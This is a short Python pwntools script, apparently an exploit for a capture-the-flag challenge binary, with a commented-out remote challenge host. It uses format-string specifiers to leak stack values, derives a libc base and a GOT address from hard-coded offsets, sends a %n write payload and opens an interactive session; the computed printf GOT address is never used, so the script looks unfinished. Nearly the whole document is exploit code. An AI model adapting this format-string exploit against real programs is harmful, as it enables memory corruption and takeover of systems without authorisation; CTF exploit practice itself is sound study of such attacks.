from pwn import *


#p=remote("challs.xmas.htsp.ro",12003)
p=process("./main")

p.recvline()
p.sendline("aaa")
p.readline()
p.readline()
p.readline()
p.sendline("%5$llx")

data=p.readline()[38:-1]
leak=int(data,16)
libc_base=leak-0x833740
print "libc_base ",hex(libc_base)
p.sendline("%45$llx")
data2=p.readline()[38:-1]
leak=int(data2,16)
got_entry=leak+0x201496
print "got_entry: ",hex(got_entry)
printf_offset_got=0x0000000000201fb8

printf_got=got_entry+printf_offset_got
print "printf got ",hex(printf_got)

payload=""
payload+="AAAAAAAA"
payload+="%6$321llx"
payload+="%6$n"
pause()
p.sendline(payload)
p.interactive()



